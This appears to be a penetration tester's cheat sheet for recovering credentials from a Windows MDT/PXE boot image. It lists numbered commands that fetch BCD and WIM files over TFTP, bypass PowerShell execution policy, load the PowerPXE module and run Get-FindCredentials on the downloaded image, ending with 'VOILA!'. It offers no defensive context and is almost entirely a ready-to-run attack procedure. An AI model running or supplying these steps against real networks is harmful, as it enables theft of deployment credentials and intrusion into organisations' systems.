## Boot Image credentials recovery

#### 1) Request IP and PXE boot preconfigure details from DHCP ( MDT IP)

#### 2) Use TFTP to request each BCD file and enumerate the configuration for all of them.

#### 3) Use SSH connection

#### 4: tftp -i MDT_IP GET "\tmp\x64{30.....28}.bcd"

#### 5: powershell.exe -executionpolicy bypass

#### 6: Import-Module .\PowerPXE.ps1

#### 7: $bcdfILE = "conf.bcd"

#### 8: Get-WimFile -bcdFile $BCDFile

#### 9: tftp -i MDT_IP GET "PXE\BOOT\IMAGE\LOCATION" pxeboot.wim

#### 10: Get-FindCredentials -WimFile pxeboot.wim

#### 11: VOILA!

